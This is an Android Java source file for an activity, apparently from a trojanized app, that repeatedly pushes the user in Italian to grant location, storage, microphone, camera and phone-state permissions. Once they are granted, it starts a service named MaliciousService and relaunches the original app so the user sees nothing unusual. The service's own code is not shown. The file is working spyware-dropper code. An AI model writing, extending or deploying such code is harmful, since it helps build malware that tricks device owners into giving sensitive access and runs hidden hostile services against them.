package com.example.android;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.List;

public class PermissionRequestActivity extends Activity {
    private static final String TAG = "PermissionActivity";
    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final int SETTINGS_REQUEST_CODE = 456;
    private static final String[] REQUIRED_PERMISSIONS = {
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.ACCESS_COARSE_LOCATION,
        android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
        android.Manifest.permission.READ_EXTERNAL_STORAGE,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.CAMERA,
        android.Manifest.permission.READ_PHONE_STATE
    };
    
    private boolean isFirstRequest = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Crea un layout semplice per mostrare un messaggio all'utente
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 100, 50, 100);
        
        TextView textView = new TextView(this);
        textView.setText("Per il corretto funzionamento dell'app, sono necessari alcuni permessi. " +
                         "Si prega di concedere tutti i permessi richiesti.");
        textView.setTextSize(18);
        layout.addView(textView);
        
        Button grantButton = new Button(this);
        grantButton.setText("Concedi Permessi");
        grantButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestMissingPermissions();
            }
        });
        layout.addView(grantButton);
        
        Button settingsButton = new Button(this);
        settingsButton.setText("Apri Impostazioni App");
        settingsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                openAppSettings();
            }
        });
        layout.addView(settingsButton);
        
        setContentView(layout);
        
        Log.d(TAG, "PermissionRequestActivity created. Checking permissions.");
        requestMissingPermissions();
    }
    
    private void openAppSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        Uri uri = Uri.fromParts("package", getPackageName(), null);
        intent.setData(uri);
        startActivityForResult(intent, SETTINGS_REQUEST_CODE);
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == SETTINGS_REQUEST_CODE) {
            // Controlla nuovamente i permessi dopo il ritorno dalle impostazioni
            requestMissingPermissions();
        }
    }

    private void requestMissingPermissions() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            Log.d(TAG, "Android version < 6.0, permissions granted at installation.");
            startServiceAndFinish();
            return;
        }
        List<String> missingPermissions = new ArrayList<>();
        for (String permission : REQUIRED_PERMISSIONS) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                missingPermissions.add(permission);
            }
        }
        if (missingPermissions.isEmpty()) {
            Log.d(TAG, "All permissions already granted.");
            Toast.makeText(this, "Tutti i permessi sono stati concessi!", Toast.LENGTH_SHORT).show();
            startServiceAndFinish();
        } else {
            Log.d(TAG, "Requesting missing permissions: " + missingPermissions.toString());
            requestPermissions(missingPermissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            List<String> deniedPermissions = new ArrayList<>();
            
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    Log.d(TAG, "Permission granted: " + permissions[i]);
                } else {
                    Log.w(TAG, "Permission denied: " + permissions[i]);
                    allGranted = false;
                    deniedPermissions.add(permissions[i]);
                }
            }
            
            if (allGranted) {
                Log.d(TAG, "All permissions granted");
                Toast.makeText(this, "Tutti i permessi sono stati concessi!", Toast.LENGTH_SHORT).show();
                startServiceAndFinish();
            } else {
                Log.w(TAG, "Some permissions denied: " + deniedPermissions);
                
                if (isFirstRequest) {
                    isFirstRequest = false;
                    Toast.makeText(this, "Alcuni permessi sono stati negati. Per favore, concedi tutti i permessi per il corretto funzionamento dell'app.", Toast.LENGTH_LONG).show();
                } else {
                    Toast.makeText(this, "Per favore, apri le impostazioni dell'app e concedi manualmente tutti i permessi richiesti.", Toast.LENGTH_LONG).show();
                }
                
                // Non terminare l'attività, lascia che l'utente possa riprovare
            }
        }
    }

    private void startServiceAndFinish() {
        Intent serviceIntent = new Intent(this, MaliciousService.class);
        try {
            if (startService(serviceIntent) != null) {
                Log.d(TAG, "MaliciousService started from PermissionRequestActivity.");
            } else {
                Log.e(TAG, "Failed to start MaliciousService from PermissionRequestActivity.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting MaliciousService from PermissionRequestActivity: " + e.getMessage(), e);
        }
        
        // Avvia anche l'app originale
        try {
            Intent launchIntent = getPackageManager().getLaunchIntentForPackage(getPackageName());
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(launchIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error launching original app: " + e.getMessage(), e);
        }
        
        finish();
        overridePendingTransition(0, 0);
    }
}